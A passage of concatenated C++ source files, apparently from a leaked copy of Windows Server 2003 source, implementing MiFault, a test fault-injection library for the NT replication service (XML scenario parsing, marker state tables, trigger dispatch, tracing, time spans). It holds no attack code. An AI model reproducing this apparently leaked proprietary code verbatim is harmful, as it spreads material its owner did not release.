CGlobal::GetScenario()
{
    // check before lock in case to help reveal init-time race conditions
    MiF_ASSERT(bInit && !bInitError);

    CAutoLock A(&cs);

    // now check for real
    MiF_ASSERT(bInit && !bInitError);

    MiF_ASSERT(pScenario);

    pScenario->AddRef();
    return pScenario;
}
=== C:/Users/treeman/Desktop/windows nt source code\Source\Win2K3\NT\ds\netapi\svcimgs\ntrepl\test\mifault\src\parse.cxx ===
#include "pch.hxx"

#define GROUPDEFS_SCHEMA_RESOURCE "groupdefs.xsd"
#define SCENARIO_SCHEMA_RESOURCE  "scenario.xsd"

#define DOM_DOCUMENT_PROGID     "MSXML2.DOMDocument.4.0"
#define XML_SCHEMA_CACHE_PROGID "MSXML2.XMLSchemaCache.4.0"

// To find sample code, search for "XMLDOMNodeSample" in MSDN

/*

   After the XML file has been validated against the schema, we know
   that the noides are in proper order and are the expected
   nodes...that's cool!

*/

using namespace MSXML2;
using namespace std;

inline
void
CHECK_HR(const char* function, HRESULT _hr)
{
    if (FAILED(_hr))
        throw(HR_ERROR(_hr, function));
}

IXMLDOMSchemaCollectionPtr
CreateSchemaCache(
    )
{
    IXMLDOMSchemaCollectionPtr ptrSchemaCache;
    CHECK_HR("CreateInstance",
             ptrSchemaCache.CreateInstance(XML_SCHEMA_CACHE_PROGID));
    return ptrSchemaCache;
}

IXMLDOMDocument2Ptr
CreateDocument()
{
    IXMLDOMDocument2Ptr ptrDoc;
    CHECK_HR("CreateInstance",
             ptrDoc.CreateInstance(DOM_DOCUMENT_PROGID));
    return ptrDoc;
}

IXMLDOMDocumentPtr
LoadXmlFromFile(
    const char* filename,
    IXMLDOMSchemaCollection* pISchemaCache = 0
    )
{
    IXMLDOMDocument2Ptr ptrDoc = CreateDocument();

    ptrDoc->async = false;

    if (pISchemaCache)
        ptrDoc->schemas = pISchemaCache;

    _variant_t varXml(filename);
    _variant_t varOut;

    varOut = ptrDoc->load(varXml);
    if ((bool)varOut == false) {
        bool IsParseError =
            ptrDoc->parseError->errorCode && ptrDoc->parseError->linepos;
        if (IsParseError) {
            stringstream s;
            s << "Parse Error:" << endl
              << static_cast<const char*>(ptrDoc->parseError->reason)
              << "at postion " << ptrDoc->parseError->linepos
              << " on line " << ptrDoc->parseError->line << ":" << endl
              << static_cast<const char*>(ptrDoc->parseError->srcText)
              << endl;
            MiF_TRACE(MiF_ERROR, "%s", s.str().c_str());
        }

        _bstr_t error;
        error += "load() of \"";
        error += filename;
        error += "\" failed: ";
        error += IsParseError ? "parsing error" : ptrDoc->parseError->reason;
        throw(error);
    }

    MiF_TRACE(MiF_INFO, "Loaded XML From File: %s", filename);

    return ptrDoc;
}

IXMLDOMDocumentPtr
LoadXmlFromHtmlResource(
    const char* resource,
    IXMLDOMSchemaCollection* pISchemaCache = 0
    )
{
    char* buffer = 0;
    HMODULE hModule = Global.hInstance;

    MiF_ASSERT(hModule);

    try {
        HRSRC hrRes = FindResource(hModule, resource, RT_HTML);
        if (hrRes == NULL) {
            throw WIN32_ERROR(GetLastError(), "FindResource");
        }

        DWORD size = SizeofResource(hModule, hrRes);

        buffer = new char[size + 1];

        HGLOBAL hgRes = LoadResource(hModule, hrRes);
        if (hgRes == NULL) {
            throw WIN32_ERROR(GetLastError(), "LoadResource");
        }

        char* data = reinterpret_cast<char*>(LockResource(hgRes));
        if (data == NULL) {
            throw WIN32_ERROR(GetLastError(), "LockResource");
        }

        memcpy(buffer, data, size);
        buffer[size] = 0;

        IXMLDOMDocument2Ptr ptrDoc = CreateDocument();

        ptrDoc->async = false;

        if (pISchemaCache)
            ptrDoc->schemas = pISchemaCache;

        _bstr_t varXml(buffer);
        _variant_t varOut;

        varOut = ptrDoc->loadXML(varXml);
        if ((bool)varOut == false) {
            _bstr_t error;
            error += "loadXML() of resource \"";
            error += resource;
            error += "\" failed: ";
            error += ptrDoc->parseError->reason;
            throw(error);
        }

        MiF_TRACE(MiF_INFO, "Loaded XML From HTML Resource: %s", resource);

        delete [] buffer;
        return ptrDoc;
    }
    catch (...)
    {
        if (buffer)
            delete [] buffer;
        throw;
    }
}

_bstr_t
LoadSchemaCache(
    IXMLDOMSchemaCollectionPtr ptrSchemaCache,
    const char* resource
    )
{
    // Load the XML schema from the a resource.
    IXMLDOMDocumentPtr ptrSchema = LoadXmlFromHtmlResource(resource);

    _bstr_t ns;

    // Check that we have a namespaceURI and a targetNamespace. We
    // don't really need namespaceURI, but we must have a
    // targetNamespace so that we can properly add it to the schema
    // cache.
    try
    {
        MiF_TRACE(MiF_DEBUG2, "Schema Namespace URI = %s",
                  static_cast<const char*>(
                      ptrSchema->documentElement->namespaceURI));

        IXMLDOMNodePtr ptrNode =
            ptrSchema->documentElement->attributes->getNamedItem("targetNamespace");
        MiF_TRACE(MiF_DEBUG2, "Schema targetNamespace = %s",
                  static_cast<const char*>(
                      static_cast<_bstr_t>(ptrNode->nodeValue)));

        ns = ptrSchema->documentElement->attributes->getNamedItem("targetNamespace")->nodeValue;
    }
    catch (...)
    {
        MiF_TRACE(MiF_ERROR, "Failed to determine targetNamespace");
        throw;
    }

    try
    {
        ptrSchemaCache->add(ns, ptrSchema.GetInterfacePtr());
    }
    catch (...)
    {
        MiF_TRACE(MiF_ERROR, "Failed to add schema to schema cache");
        throw;
    }

    return ns;
}

// ParseFile
//
//   Cannot return NULL.  Must either return a valid T* or throw an exception.

template <class T, class P>
T*
ParseFileUsingSchemaCache(
    IXMLDOMSchemaCollectionPtr ptrSchemaCache,
    const char* FileName,
    const _bstr_t SchemaNameSpace,
    const char* TopNode,
    const char* Description,
    P* CreationParameter
    )
{
    IXMLDOMDocument2Ptr ptrDoc =
        LoadXmlFromFile(FileName, ptrSchemaCache.GetInterfacePtr());
    _bstr_t NameSpace;

    try {
        NameSpace = ptrDoc->documentElement->namespaceURI;
    }
    catch (...)
    {
        MiF_TRACE(MiF_ERROR, "Failed to get namespace URI for top node");
        throw;
    }

    MiF_TRACE(MiF_DEBUG2, "Document Namespace URI = %s",
              static_cast<const char*>(NameSpace));

    if (NameSpace != SchemaNameSpace) {
        throw "Namespace mismatch";
    }

    // We do not need this because we are already doing load-time
    // validation, which gives us more detailed error information
    //
    // Actually, I lied.  Apparently, the validate on load does more
    // of a type check thing.  This will catch the problem of putting
    // in the wrong kind of XML file...
    ptrDoc->schemas = ptrSchemaCache.GetInterfacePtr();

    IXMLDOMParseErrorPtr ptrParseError = ptrDoc->validate();
    if (ptrParseError->errorCode)
    {
        stringstream s;
        s << "Validation Error:" << endl
          << static_cast<const char*>(ptrParseError->reason)
        // Apparently, we cannot use the position and source text info
        // in post-validation because that info is lost
          << "The XML file does not match the active schema definitions"
          << endl;
        throw s.str();
    }

    try {
        try {
            ptrDoc->setProperty("SelectionLanguage", "XPath");

            NameSpace = "xmlns:NS='";
            NameSpace += SchemaNameSpace;
            NameSpace += "'";

            ptrDoc->setProperty("SelectionNamespaces", NameSpace);
        }
        catch (...) {
            MiF_TRACE(MiF_ERROR, "Failed to set selection properties");
            throw;
        }

        try {
            return new T(ptrDoc->selectSingleNode(TopNode), CreationParameter);
        }
        catch (string s) {
            MiF_TRACE(MiF_ERROR, "Error in XML: %s", s.c_str());
            throw;
        }
        catch (...) {
            MiF_TRACE(MiF_ERROR, "Error in XML");
            throw;
        }

    }
    catch (...)
    {
        MiF_TRACE(MiF_ERROR, "Invalid %s", Description);
        throw;
    }
}


// ParseFile
//
//   Cannot return NULL.  Must either return a valid T* or throw an exception.

template <class T, class P>
T*
ParseFile(
    const char* FileName,
    const char* SchemaResource,
    const char* TopNode,
    const char* Description,
    P* CreationParameter
    )
{
    CHECK_HR("CoInitializeEx", CoInitializeEx(NULL, 0));

    T* pResult = 0;

    try {
        // create cache for schema
        IXMLDOMSchemaCollectionPtr ptrSchemaCache = CreateSchemaCache();

        // load schema into the cache and get namespace
        _bstr_t NameSpace = LoadSchemaCache(ptrSchemaCache, SchemaResource);

        // load and validate XML
        pResult = ParseFileUsingSchemaCache<T, P>(ptrSchemaCache,
                                                  FileName,
                                                  NameSpace,
                                                  TopNode,
                                                  Description,
                                                  CreationParameter);

        MiF_TRACE(MiF_INFO, "%s loaded successfully", Description);
    }
    catch (...) {
        CoUninitialize();
        MiF_TRACE(MiF_ERROR, "Could not load %s", Description);
        throw;
    }
    CoUninitialize();

    MiF_ASSERT(pResult);
    return pResult;
}

CGroupDefs*
LoadGroupDefs(
    const char* FileName,
    const CWrapperFunction* pWrappers,
    size_t NumWrappers
    )
{
    CGroupDefs::Params CreationParams(pWrappers, NumWrappers);
    return ParseFile<CGroupDefs, CGroupDefs::Params>(
        FileName,
        GROUPDEFS_SCHEMA_RESOURCE,
        "NS:GroupDefs",
        "Group Definition File",
        &CreationParams);
}

CScenario*
LoadScenario(
    const char* FileName,
    _bstr_t Node,
    const CGroupDefs* pGroupDefs,
    size_t NumWrappers
    )
{
    CScenario::Params CreationParams(Node, GetFileModTime(FileName),
                                     pGroupDefs, NumWrappers);

    CScenario* pScenario =
        ParseFile<CScenario, CScenario::Params>(
            FileName,
            SCENARIO_SCHEMA_RESOURCE,
            "NS:Scenario",
            "Scenario File",
            &CreationParams);
    try {
        pScenario->Init();
    }
    catch (...) {
        pScenario->Release();
        throw;
    }
    return pScenario;
}
=== C:/Users/treeman/Desktop/windows nt source code\Source\Win2K3\NT\ds\netapi\svcimgs\ntrepl\test\mifault\src\mst.cxx ===
#include "pch.hxx"

// ----------------------------------------------------------------------------
// MSTE - Marker State Table Entry

CMSTE::CMSTE(
    ):
    m_pMarkerState(0),
    m_pEvent(0)
{
}

CMSTE::CMSTE(
    const CMarkerState* pMarkerState,
    const CEvent* pEvent
    ):
    m_pMarkerState(pMarkerState),
    m_pEvent(pEvent)
{
}

void
CMSTE::Clear()
{
    m_pMarkerState = 0;
    m_pEvent = 0;
}


bool
CMSTE::IsClear() const
{
    return (m_pMarkerState == NULL) && (m_pEvent == NULL);
}



// ----------------------------------------------------------------------------
// MST - Marker State Table

CMST::CMST(ULONG uCount):
    m_hMutex(CreateMutex(NULL, FALSE, NULL)),
    m_uCount(uCount),
    m_Table(0)
{
    if (m_hMutex == NULL)
        throw "Cannot create mutex for Marker State Table (MST)";
    m_Table = new CMSTE[uCount];
}


CMST::~CMST() {
    CloseHandle(m_hMutex);
    delete [] m_Table;
}


void
CMST::Lock() const
{
    DWORD status = WaitForSingleObject(m_hMutex, INFINITE);
    MiF_ASSERT(status == WAIT_OBJECT_0);
}


void
CMST::Unlock() const
{
    ReleaseMutex(m_hMutex);
}


bool
CMST::IsValidIndex(ULONG uFunctionIndex) const
{
    return uFunctionIndex < m_uCount;
}


#if 0
bool
CMST::Lookup(ULONG uFunctionIndex, OUT CMSTE* pMSTE) const
{
    MiF_ASSERT(IsValidIndex(uFunctionIndex));

    CMSTE temp;
    CMSTE& MSTE = pMSTE ? *pMSTE : temp;

    Lock();
    MSTE = m_Table[uFunctionIndex];
    Unlock();

    return !MSTE.IsClear();
}
#endif


bool
CMST::Lookup(
    ULONG uFunctionIndex,
    OUT const CMarkerState*& pMarkerState,
    OUT const CEvent*& pEvent
    ) const
{
    MiF_ASSERT(IsValidIndex(uFunctionIndex));

    Lock();
    CMSTE& Entry = m_Table[uFunctionIndex];
    bool found = !Entry.IsClear();
    pMarkerState = Entry.m_pMarkerState;
    pEvent = Entry.m_pEvent;
    Unlock();

    return found;
}


bool
CMST::Activate(
    ULONG uFunctionIndex,
    IN const CMarkerState* pMarkerState,
    IN const CEvent* pEvent
    )
{
    MiF_ASSERT(IsValidIndex(uFunctionIndex));

    Lock();
    CMSTE& Entry = m_Table[uFunctionIndex];
    bool found = Entry.IsClear();
    if (found) {
        Entry = CMSTE(pMarkerState, pEvent);
    }
    Unlock();

    return found;
}


bool
CMST::Deactivate(
    ULONG uFunctionIndex,
    IN const CMarkerState* pMarkerState, // for validation
    IN const CEvent* pEvent // for validation
    )
{
    MiF_ASSERT(IsValidIndex(uFunctionIndex));

    Lock();
    CMSTE& Entry = m_Table[uFunctionIndex];
    bool found = !Entry.IsClear();
    if (found) {
        MiF_ASSERT(Entry.m_pMarkerState == pMarkerState);
        MiF_ASSERT(Entry.m_pEvent == pEvent);
        Entry.Clear();
    }
    Unlock();

    return found;
}
=== C:/Users/treeman/Desktop/windows nt source code\Source\Win2K3\NT\ds\netapi\svcimgs\ntrepl\test\mifault\src\mifault.cxx ===
#include "pch.hxx"
//#include "mifault.tmh"

#ifndef END_N95AMESPACE
#define BEGIN_NAMESPACE(ns) namespace ns {
#define END_NAMESPACE }
#endif

using namespace MiFaultLib;


// ----------------------------------------------------------------------------
// DllMain

BOOL
APIENTRY
DllMain(
    HINSTANCE hInstDLL,
    DWORD dwReason,
    LPVOID
    )
{
    switch (dwReason)
    {
    case DLL_PROCESS_ATTACH:
        //WPP_INIT_TRACING(L"Microsoft\\MiFault");
        return Global.ProcessAttach(hInstDLL);

    case DLL_PROCESS_DETACH:
    {
        BOOL result = Global.ProcessDetach();
        //WPP_CLEANUP();
        return result;
    }

    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
        return TRUE;
    }

    // Should never reach here
    return TRUE;
}


// ----------------------------------------------------------------------------
// Wrap

BEGIN_NAMESPACE(MiFaultLib)

BOOL
FilterAttach(
    HINSTANCE const hInstDLL,
    DWORD const dwReason,
    CSetPointManager* pSetPointManager,
    const CWrapperFunction* pWrappers,
    size_t NumWrappers,
    const char* ModuleName
    )
{
    switch (dwReason)
    {
    case DLL_PROCESS_ATTACH:
        return Global.WrapperAttach(pSetPointManager, pWrappers, NumWrappers,
                                    ModuleName);

    case DLL_PROCESS_DETACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
        return TRUE;
    }

    // Should never reach here
    return TRUE;
}


BOOL
FilterDetach(
    HINSTANCE const hInstDLL,
    DWORD const dwReason
    )
{
    switch (dwReason)
    {
    case DLL_PROCESS_DETACH:
        return Global.WrapperDetach();

    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
        return TRUE;
    }

    // Should never reach here
    return TRUE;
}


PVOID
Triggered(
    IN size_t const uFunctionIndex
    )
{
    if (!Global.Init())
        return 0;

    CMarkerState* pMarkerState = 0;
    CEvent* pEvent = 0;

    // Get the scenario
    CScenario* pScenario = Global.GetScenario();

    // Do any necessary event processing
    while (pScenario->ProcessEvent());

    // Figure out whether anything is active at this site
    bool bActive = pScenario->Lookup(uFunctionIndex,
                                     OUT pMarkerState, OUT pEvent);
    if (!bActive) {
        MiF_TRACE(MiF_INFO, "--------- NOT TRIGGERED! -------------");
        pScenario->Release();
        return 0;
    };

    MiF_TRACE(MiF_INFO, "--------- TRIGGERED! -------------");

    // select the case
    const CCase* pCase = pMarkerState->SelectCase();

    // get the fault function pointer to return
    PVOID pfnFaultFunction = pCase->m_pfnFaultFunction;
    MiF_ASSERT(pfnFaultFunction);

    // create the trigger object
    CI_Trigger_Imp* pTrigger = new CI_Trigger_Imp(pScenario,
                                                  pMarkerState,
                                                  pEvent,
                                                  pCase);

    // make sure there is nothing in TLS
    MiF_ASSERT(Global.pILibImplementation->_GetTrigger() == 0);

    // stash it in TLS
    Global.pILibImplementation->_SetTrigger(pTrigger);

    // release the scenario
    pScenario->Release();

    return pfnFaultFunction;
}


void
TriggerFinished(
    )
{
    // Get trigger from TLS
    CI_Trigger_Imp* pTrigger = Global.pILibImplementation->_GetTrigger();
    MiF_ASSERT(pTrigger);

    // delete it
    delete pTrigger;

    // clean out TLS
    Global.pILibImplementation->_SetTrigger(0);
}

END_NAMESPACE


// ----------------------------------------------------------------------------
// Control

extern "C"
BOOL
WINAPI
MiFaultLibStartup(
    )
{
    return Global.Init(); // XXX - rename to Global.Startup?
}

extern "C"
void
WINAPI
MiFaultLibShutdown(
    )
{
    // XXX - Global.Shutdown?
}

extern "C"
int
__cdecl
MiFaultLibTestA(
    int argc,
    char *argv[]
    )
{
    const char* GroupDefs = 0;
    const char* Scenario = 0;

    cout << "NOTE: This application requires MSXML 4.0" << endl << endl;

    if (argc < 3) {
        cerr << "usage: " << argv[0] << " groupdefs scenario" << endl;
        return 1;
    }

    GroupDefs = argv[1];
    Scenario = argv[2];

    cout << "groupdef: " << GroupDefs << endl
         << "scenario: " << Scenario << endl
         << endl;

    bool bError = false;
    try {
        if (!Global.Init()) {
            cerr << "Could not initialize global state" << endl;
            return 1;
        }

        cout << endl
             << "--------------------------------------------------------"
             << endl << endl;

        CGroupDefs* pGroupDefs =
            LoadGroupDefs(GroupDefs, Global.pWrappers, Global.NumWrappers);
        cout << endl;

        CScenario* pScenario =
            LoadScenario(Scenario, Global.NodeName, pGroupDefs, Global.NumWrappers);
        pScenario->DumpPseudoEvents();
        pScenario->Release();

        cout << endl;

        cout << endl
             << "--------------------------------------------------------"
             << endl << endl;

    }
    catch (...) {
        global_exception_handler();
        bError = true;
    }

    if (!bError) {
        // while (1)
        Sleep(INFINITE);
    }

    return bError ? 1 : 0;
}


void
MiFaultLibAssertFailed(
    const char* expression,
    const char* file,
    unsigned int line
    )
{
    MiF_TRACE(MiF_FATAL, "Assertion failed: %s, file %s, line %u",
              expression, file, line);
    abort();
}
=== C:/Users/treeman/Desktop/windows nt source code\Source\Win2K3\NT\ds\netapi\svcimgs\ntrepl\test\mifault\src\strtok_r.h ===
/* reentrant strtok */

#pragma once

#if defined(__cplusplus)
extern "C"
{
#endif

char * __cdecl strtok_r (
	char * string,
	const char * control,
	char ** nextoken
	);

#if defined(__cplusplus)
} /* extern "C" */
#endif
=== C:/Users/treeman/Desktop/windows nt source code\Source\Win2K3\NT\ds\netapi\svcimgs\ntrepl\test\mifault\src\trace.cxx ===
#include "pch.hxx"
#include <strsafe.h>

static bool g_TraceLevelInit = false;
static unsigned int g_TraceLevel = 0;

inline
unsigned int
GetTraceLevel(
    )
{
    if (g_TraceLevelInit)
        return g_TraceLevel;

    bool bOk;

    char buffer[MAX_PATH + 1];
    buffer[MAX_PATH] = 0;

    CIniFile& IniFile = Global.pSetPointManager->GetIniFile();

    g_TraceLevel = GetPrivateProfileInt("MiFault", "TraceLevel", 0,
                                        IniFile.GetFileName());
    g_TraceLevelInit = true;
    return g_TraceLevel;
}

#define CASE(x) case MiF_##x: return "L_" #x; case MiFF_##x: return "F_" #x

static
const char*
GetTraceLevelString(
    unsigned int level
    )
{
    switch (level)
    {
        CASE(FATAL);
        CASE(ERROR);
        CASE(WARNING);
        CASE(INFO);
        CASE(INFO2);
        CASE(INFO3);
        CASE(INFO4);
        CASE(DEBUG);
        CASE(DEBUG2);
        CASE(DEBUG3);
        CASE(DEBUG4);
    }
    return "*UNKNOWN*";
}

static
void
MiFaultLibTraceV(
    unsigned int level,
    const char* format,
    va_list args, 
    bool exclusive
    )
{
    if (!(level & GetTraceLevel()))
        return;

    char buffer[1024];

    StringCbVPrintf(buffer, sizeof(buffer), format, args);

    const char* level_string = GetTraceLevelString(level);

    if (exclusive)
        Global.pSetPointManager->GetLogStream().ExclusivePrint("[%9s] %s",
                                                               level_string,
                                                               buffer);
    else
        Global.pSetPointManager->GetLogStream().TraceA("[%9s] %s",
                                                       level_string,
                                                       buffer);
}


void
MiFaultLibTrace(
    unsigned int level,
    const char* format,
    ...
    )
{
    va_list args;
    va_start(args, format);
    MiFaultLibTraceV(level, format, args, false);
    va_end(args);
}

void
MiFaultLibTraceV(
    unsigned int level,
    const char* format,
    va_list args
    )
{
    MiFaultLibTraceV(level, format, args, false);
}


#if 0
void
MiFaultLibTraceExclusive(
    unsigned int level,
    const char* format,
    ...
    )
{
    va_list args;
    va_start(args, format);
    MiFaultLibTraceV(level, format, true, args);
    va_end(args);
}


void
MiFaultLibTraceStartExclusive(
    )
{
    Global.pSetPointManager->GetLogStream().ExclusiveStart();
}


void
MiFaultLibTraceStopExclusive(
    )
{
    Global.pSetPointManager->GetLogStream().ExclusiveFinish();
}
#endif
=== C:/Users/treeman/Desktop/windows nt source code\Source\Win2K3\NT\ds\netapi\svcimgs\ntrepl\test\mifault\src\triggerinfo.cxx ===
#include "pch.hxx"

// ----------------------------------------------------------------------------
// CI_Args_Imp<T>

template <class T>
CI_Args_Imp<T>::CI_Args_Imp(
    CScenario* pScenario,
    const T* pParent
    ):
    m_pScenario(pScenario),
    m_Arguments(pParent->m_Arguments),
    m_LockCounter(0)
{
    MiF_ASSERT(m_pScenario);
    MiF_ASSERT(pParent);

    m_pScenario->AddRef();
}

template <class T>
CI_Args_Imp<T>::~CI_Args_Imp()
{
    Done();
}

template <class T>
const size_t
CI_Args_Imp<T>::GetCount()
{
    MiF_ASSERT(m_pScenario);

    return m_Arguments.count();
}

template <class T>
const Arg
CI_Args_Imp<T>::GetArg(
    size_t index
    )
{
    MiF_ASSERT(m_pScenario);
    MiF_ASSERT(index < GetCount());

    const CArgument<T>* pArgument = m_Arguments.item(index);

    Arg arg;
    arg.Name = (const char*)pArgument->m_Name;
    arg.Value = (const char*)pArgument->m_Value;

    return arg;
}

template <class T>
void*
CI_Args_Imp<T>::GetParsedArgs()
{
    MiF_ASSERT(m_pScenario);

    return m_Arguments.GetParsedArgs();
}

template <class T>
bool
CI_Args_Imp<T>::SetParsedArgs(
    IN void* ParsedArgs,
    IN FP_CleanupParsedArgs pfnCleanup
    )
{
    MiF_ASSERT(m_pScenario);

    return m_Arguments.SetParsedArgs(ParsedArgs, pfnCleanup);
}

template <class T>
void
CI_Args_Imp<T>::Lock()
{
    MiF_ASSERT(m_pScenario);

    m_LockCounter++;
    m_Arguments.Lock();
}

template <class T>
void
CI_Args_Imp<T>::Unlock()
{
    MiF_ASSERT(m_pScenario);
    MiF_ASSERT(m_LockCounter > 0);

    m_LockCounter--;
    m_Arguments.Unlock();
}

template <class T>
void
CI_Args_Imp<T>::Done()
{
    MiF_ASSERT(m_LockCounter == 0);

    if (m_pScenario) {
        m_pScenario->Release();
        m_pScenario = 0;
    }
}


// ----------------------------------------------------------------------------
// CI_Trigger_Imp

CI_Trigger_Imp::CI_Trigger_Imp(
    CScenario* pScenario,
    const CMarkerState* pMarkerState,
    const CEvent* pEvent,
    const CCase* pCase
    ):
    m_pScenario(pScenario),
    m_pMarkerState(pMarkerState),
    m_pEvent(pEvent),
    m_GroupArgs(pScenario, pEvent),
    m_FunctionArgs(pScenario, pCase)
{
    MiF_ASSERT(m_pScenario);
    MiF_ASSERT(m_pMarkerState);
    MiF_ASSERT(m_pEvent);

    m_pScenario->AddRef();
}

CI_Trigger_Imp::~CI_Trigger_Imp()
{
    Done();
}

const char*
CI_Trigger_Imp::GetGroupName()
{
    MiF_ASSERT(m_pScenario);

    return (const char*)m_pEvent->m_GroupName;
}

const char*
CI_Trigger_Imp::GetTagName()
{
    MiF_ASSERT(m_pScenario);

    return (const char*)m_pMarkerState->m_Marker.m_Tag;
}

const char*
CI_Trigger_Imp::GetFunctionName()
{
    MiF_ASSERT(m_pScenario);

    return (const char*)m_pMarkerState->m_Marker.m_Function;
}

const size_t
CI_Trigger_Imp::GetFunctionIndex()
{
    MiF_ASSERT(m_pScenario);

    return m_pMarkerState->m_Marker.m_uFunctionIndex;
}

I_Args*
CI_Trigger_Imp::GetFunctionArgs()
{
    MiF_ASSERT(m_pScenario);

    return &m_FunctionArgs;
}

I_Args*
CI_Trigger_Imp::GetGroupArgs()
{
    MiF_ASSERT(m_pScenario);

    return &m_GroupArgs;
}

void
CI_Trigger_Imp::Done()
{
    m_FunctionArgs.Done();
    m_GroupArgs.Done();

    if (m_pScenario) {
        m_pScenario->Release();
        m_pScenario = 0;
    }
}


// ----------------------------------------------------------------------------
// CI_Lib_Imp

CI_Lib_Imp::CI_Lib_Imp(
    DWORD TlsIndex
    ):
    m_TlsIndex(TlsIndex)
{
}

CI_Lib_Imp::~CI_Lib_Imp(
    )
{
}

// Can set to NULL
void
CI_Lib_Imp::_SetTrigger(
    CI_Trigger_Imp* pTrigger
    )
{
    BOOL bOk = TlsSetValue(m_TlsIndex, pTrigger);
    MiF_ASSERT(bOk);
    if (!bOk)
        throw WIN32_ERROR(GetLastError(), "TlsGetValue");
}

// Might return NULL
CI_Trigger_Imp*
CI_Lib_Imp::_GetTrigger(
    )
{
    CI_Trigger_Imp* pTrigger =
        reinterpret_cast<CI_Trigger_Imp*>(TlsGetValue(m_TlsIndex));
    if (!pTrigger) {
        DWORD dwStatus = GetLastError();
        MiF_ASSERT(dwStatus == NO_ERROR);
        if (dwStatus != NO_ERROR)
            throw WIN32_ERROR(dwStatus, "TlsGetValue");
    }
    return pTrigger;
}

// Must return non-NULL pointer
I_Trigger*
CI_Lib_Imp::GetTrigger(
    )
{
    CI_Trigger_Imp* pTrigger =
        reinterpret_cast<CI_Trigger_Imp*>(TlsGetValue(m_TlsIndex));
    MiF_ASSERT(pTrigger);
    if (!pTrigger) {
        DWORD dwStatus = GetLastError();
        MiF_ASSERT(dwStatus == NO_ERROR);
        if (dwStatus != NO_ERROR)
            throw WIN32_ERROR(dwStatus, "TlsGetValue");
        else
            throw "Trigger not set while calling GetTrigger()";
    }
    return static_cast<I_Trigger*>(pTrigger);
}

void
CI_Lib_Imp::Trace(
    unsigned int level,
    const char* format,
    ...
    )
{
    va_list args;
    va_start(args, format);
    MiFaultLibTraceV(level, format, args);
    va_end(args);
}

void*
CI_Lib_Imp::GetOriginalFunctionAddress(
    )
{
    return CInjectorRT::GetOrigFunctionAddress();
}

void*
CI_Lib_Imp::GetPublishedFunctionAddress(
    const char* FunctionName
    )
{
    return CInjectorRT::GetFunctionAddressEx(Global.ModuleName.c_str(),
                                             Global.ModuleName.c_str(),
                                             FunctionName);
}
=== C:/Users/treeman/Desktop/windows nt source code\Source\Win2K3\NT\ds\netapi\svcimgs\ntrepl\test\mifault\src\time.cxx ===
#include "pch.hxx"

using namespace std;


// ----------------------------------------------------------------------------
// CTicker

CTicker::CTicker()
{
    InitializeCriticalSection(&m_cs);
    m_liLastTime.QuadPart = GetTickCount();
}

CTicker::~CTicker()
{ 
    DeleteCriticalSection(&m_cs);
}

// returns 100ns ticks
ULONGLONG CTicker::GetUpdateFrequency() const
{
    return GetUpdateFrequencyMs() * 10000;
}

// returns mecs
DWORD CTicker::GetUpdateFrequencyMs() const
{
    //       12345678
    return 0x10000000; // about 3 days, just to be safe
}

// returns 100ns ticks
CTicks CTicker::GetTicks()
{
    return GetTicksMs() * 10000;
}

// returns mecs
ULONGLONG CTicker::GetTicksMs()
{
    ULONG ulCurTimeLow = GetTickCount();

    //
    // see if timer has wrapped
    //
    // since multi-threaded, it might get preempted and CurrentTime
    // might get lower than the variable m_liLastTime.LowPart
    // which might be set by another thread. So we also explicitly verify the
    // switch from a very large DWORD to a small one.
    // (code thanks to murlik & jamesg)
    //

    if ( (ulCurTimeLow < m_liLastTime.LowPart)
        && ((LONG)m_liLastTime.LowPart < 0)
        && ((LONG)ulCurTimeLow > 0) )
    {
        CAutoLock a(&m_cs);

        // make sure that the global timer has not been updated meanwhile
        if ( (LONG)m_liLastTime.LowPart < 0)
        {
            m_liLastTime.HighPart++;
            m_liLastTime.LowPart = ulCurTimeLow;
        }

    }
   
    m_liLastTime.LowPart = ulCurTimeLow;

    return m_liLastTime.QuadPart;
}



// ----------------------------------------------------------------------------
// CMTimeSpan

// Constructors

CMTimeSpan::CMTimeSpan(
    const LONG& Days,
    const LONG& Hours,
    const LONG& Minutes,
    const LONG& Seconds,
    const LONG& Milliseconds
    )
{
    // NOTICE-2002/07/15-daniloa -- No error-checking for arithmetic overflows
    m_TimeSpan = (Days * Day +
                  Hours * Hour +
                  Minutes * Minute +
                  Seconds * Second +
                  Milliseconds * Millisecond);
}

CMTimeSpan::CMTimeSpan(const LONGLONG& span):m_TimeSpan(span)
{
}

CMTimeSpan::CMTimeSpan():m_TimeSpan(0)
{
}

// Extractors

LONGLONG CMTimeSpan::GetDays() const
{
    return m_TimeSpan / Day;
}

LONG CMTimeSpan::GetHours() const
{
    return static_cast<LONG>(m_TimeSpan % Day / Hour);
}

LONG CMTimeSpan::GetMinutes() const
{
    return static_cast<LONG>(m_TimeSpan % Hour / Minute);
}

LONG CMTimeSpan::GetSeconds() const
{
    return static_cast<LONG>(m_TimeSpan % Minute / Second);
}

LONG CMTimeSpan::GetMilliseconds() const
{
    return static_cast<LONG>(m_TimeSpan % Second / Millisecond);
}

LONGLONG CMTimeSpan::TotalHns() const
{
    return m_TimeSpan;
}

string CMTimeSpan::Format(const char* format) const
//  * we are only interested in relative time formats, ie. it is illegal
//      to format anything dealing with absolute time (i.e. years, months,
//         day of week, day of year, timezones, ...)
//  * the only valid formats:
//      %d - # of days
//      %H - hour in 24 hour format (00-24)
//      %M - minute (00-59)
//      %S - seconds (00-59)
//      %L - milliseconds (000-999)
//      %% - percent sign (%)
//      %h - hour in 24 hour format (0-24)
//      %m - minute (0-59)
//      %s - seconds (0-59)
//      %l - milliseconds (0-999)
{
    stringstream s;
    s.fill('0');

    char ch;
    while ((ch = *format++) != '\0')
    {
        if (ch == '%')
        {
            switch (ch = *format++)
            {
            case '%':
                s << ch;
                break;
            case 'd':
                s << GetDays();
                break;
            case 'H':
                s << setw(2) << GetHours();
                break;
            case 'M':
                s << setw(2) << GetMinutes();
                break;
            case 'S':
                s << setw(2) << GetSeconds();
                break;
            case 'L':
                s << setw(3) << GetMilliseconds();
                break;
            case 'h':
                s << GetHours();
                break;
            case 'm':
                s << GetMinutes();
                break;
            case 's':
                s << GetSeconds();
                break;
            case 'l':
                s << GetMilliseconds();
                break;
            default:
                MiF_ASSERT(false); // probably a bad format character
                break;
            }
        }
        else
        {
            s << ch;
        }
    }

    return s.str();
}

#if 0
// Casting Operators

CMTimeSpan::operator LONGLONG() const
{
    return m_TimeSpan;
}
#endif

// Arithmetic Operators (NOTE: no overflow check)

